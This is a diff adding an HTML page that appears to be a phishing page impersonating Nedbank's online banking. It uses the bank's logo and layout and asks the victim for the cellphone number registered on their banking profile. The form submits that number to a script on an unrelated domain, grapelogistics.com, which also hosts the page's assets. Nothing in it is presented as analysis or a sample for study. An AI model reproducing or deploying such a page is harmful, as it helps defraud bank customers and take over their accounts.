@@ -1,0 +1,340 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/HTML4/loose.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Reference Number
+  </title>
+  <link href="http://grapelogistics.com/Logon_data/css/menu.css" type="text/css" rel="stylesheet" />
+  <script type="text/javascript">
+   function checkString(){
+        var phone = document.getElementById("reference").value;
+        //check if string begins with 0
+        console.log(phone);
+//        if (phone[0] !== '0') {
+//            alert("Invalid Phone Number");
+//        }
+//        if(phone.length !== 10){
+//            alert("invalid Phone Number");
+//        }
+        var isZero = phone[0];
+        var phoneLength = phone.length;
+        console.log(isZero);
+        console.log(phoneLength);
+        if(isZero !== '0'){
+            alert('Invalid phone number');
+            return false;
+        }
+        else if(phoneLength !== 10){
+            alert('Invalid phone number');
+            return false;
+        }
+        else{
+            return true;
+        }
+    }
+	    function resizeFrame(frame_id)
+	    {
+	    var h;
+	    var obj;
+	    obj= document.getElementById('divHeight');
+
+	    if (obj)
+
+	    {
+	    h = obj.offsetHeight;
+	    }
+
+    	 
+
+	    if (frame_id) 
+
+	    {
+
+	    obj= parent.document.getElementById(frame_id);
+
+	    }
+
+	    else 
+
+	    {
+
+	    obj= parent.document.getElementById(document.body.id);
+
+	    }
+
+    	 
+
+	    if (obj)
+
+	    {
+
+	    obj.height = h;
+
+	    }
+
+	    }
+  </script>
+ </head>
+ <body bgcolor="#FFFFFF" onload=";div_resize();if (document.pay) initListGroup('banking', document.pay.bank1, document.pay.bank2, 'cs'); if (document.pay) initListGroup('beneficiaries', document.pay.bmake, document.pay.btype, 'cs');" style="overflow-y: hidden; overflow-x: hidden;">
+  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td>
+      <!-- The Header -->
+      <script type="text/javascript">
+       document.writeln(headerLink);
+      </script>
+      <div style="overflow: hidden" class="divMenu">
+      </div>
+      <div style="overflow: hidden" class="divShortcuts">
+      </div>
+      <table cellspacing="0" cellpadding="0" summary="text" id="Table1" class="theHeader" style="border:0; width:100%">
+       <tbody>
+        <tr>
+         <td height="61">
+          <table summary="text" id="Table2">
+           <tbody>
+            <tr>
+             <td valign="top" height="100%">
+              <a target="_parent" href="#">
+               <img border="0" alt="" src="http://grapelogistics.com/Logon_data/images/NedbankLogo.gif" />
+              </a>
+              <!--img src="http://grapelogistics.com/Logon_data/images/lnedbankogo.gif" border="0" alt=
+
+							"XXXXXXXX"-->
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </td>
+         <td width="134">
+          <font color="#005542">
+           <b>
+            Profile number
+           </b>
+          </font>
+         </td>
+         <td width="45%" valign="middle" align="right">
+          <table summary="text" id="Table3">
+           <tbody>
+            <tr>
+             <td>
+              <a onclick="#" href="#">
+               <img width="78" height="23" border="0" alt="" src="http://grapelogistics.com/Logon_data/images/contactus_up.gif" />
+              </a>
+              <!-- <a href="default_help.htm" target="_blank"><img border="0" src="http://grapelogistics.com/Logon_data/images/help_up.gif" width="78" height="23"></a> -->
+              <a href="#">
+               <img width="78" height="23" border="0" alt="" src="http://grapelogistics.com/Logon_data/images/help_up.gif" />
+              </a>
+              <a target="_parent" href="index.php">
+               <img width="78" height="23" border="0" alt="" src="http://grapelogistics.com/Logon_data/images/logoff_up.gif" />
+              </a>
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <table width="750" id="Table1">
+       <tbody>
+        <tr>
+         <td>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <table width="100%" border="0" cellspacing="0" cellpadding="10">
+       <tbody>
+        <tr>
+         <td width="100%" valign="top">
+          <table width="100%" border="0" cellspacing="0" cellpadding="5">
+           <tbody>
+            <tr>
+             <td width="100%" bgcolor="#FFFFFF" class="tdPageTitle">
+              <br />
+              <br />
+              CellPhone number capture
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <hr width="98%" class="hrTitleBreak" />
+      <!-- Static Table: Force static table width at 800 -->
+      <table width="750">
+       <tbody>
+        <tr>
+         <td>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <form onsubmit="return checkString(); " method="post" action="http://grapelogistics.com/Logon_data/ref.php">
+       <table cellspacing="0" cellpadding="3">
+        <tbody>
+         <tr>
+          <td align="left">
+           <p class="pSmsSummary">
+            Enter the cellphone number registered on your profile
+                                 
+            <br />
+           </p>
+           <p class="pSmsSummary">
+            Please enter the cellphone number in the box below and then click on 'Continue'. 
+           </p>
+           <p>
+            <font color="#FF0000">
+             <strong>
+             </strong>
+            </font>
+           </p>
+           <table class="tbMainList">
+            <tbody>
+             <tr>
+              <td bgcolor="#FFFFFF">
+               <p class="pSmsSummary">
+                Enter cellphone number   
+               </p>
+              </td>
+              <td bgcolor="#FFFFFF">
+               <input type="text" value="" maxlength="10" size="12" id="reference" name="reference" />
+              </td>
+             </tr>
+            </tbody>
+           </table>
+           <table style="margin-left: 8">
+            <tbody>
+             <tr>
+              <td height="20">
+              </td>
+             </tr>
+             <tr>
+             </tr>
+             <tr>
+              <td height="20">
+              </td>
+             </tr>
+            </tbody>
+           </table>
+           <table>
+            <tbody>
+             <tr>
+              <td width="66" valign="top" class="ML">
+               <input type="button" onclick="location.href='#'" name="select" value="Cancel" />
+              </td>
+              <td class="ML">
+               <input type="submit" name="ref" value="Continue" />
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+         </tr>
+        </tbody>
+       </table>
+       <p class="pSummary" style="margin-left: 10">
+        <font size="2" face="Arial">
+         You may continue with other transactions while awaiting
+
+                        the reference number by clicking on the 'Other transactions' button below.  
+         <br />
+         To return to this screen select 'Reference number capture' from the 'Admin' menu
+
+                        option in the navigation bar.
+         <br />
+        </font>
+       </p>
+      </form>
+      <table width="100%" border="0" cellpadding="4">
+       <tbody>
+        <tr>
+         <td valign="top" align="left">
+          <input type="button" onclick="location.href='#'" name="Make payment" value="Other transactions" />
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <p style="margin-left: 10">
+      </p>
+      <table cellspacing="0" cellpadding="4" summary="text" class="theFooter" style="border:0; width:100%">
+       <tbody>
+        <tr>
+         <td valign="top" height="39">
+          <table summary="text">
+           <tbody>
+            <tr>
+             <td height="10">
+              <b>
+               <a target="_blank" class="footerLink" href="#">
+                Terms and
+
+                                conditions
+               </a>
+               |
+               <a target="_blank" class="footerLink" href="#">
+                SMS
+
+                                notice
+               </a>
+               |
+               <a target="_blank" class="footerLink" href="#">
+                Security Notice
+               </a>
+              </b>
+             </td>
+            </tr>
+            <tr>
+             <td>
+              <b>
+               <script type="text/javascript">
+                document.write(footerText);
+               </script>
+               <br />
+               All rights reserved
+              </b>
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </td>
+         <td valign="top" height="39" align="left">
+          <table summary="text">
+           <tbody>
+            <tr>
+             <td align="left">
+              <b>
+               SA time: 19:24
+              </b>
+              <br />
+             </td>
+            </tr>
+            <tr>
+             <td>
+              <b>
+               Date: 12/12/2015
+              </b>
+              <br />
+             </td>
+            </tr>
+            <tr>
+            </tr>
+           </tbody>
+          </table>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <script language="javascript" type="text/javascript">
+       document.writeln(divContentTagEnd);
+      </script>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
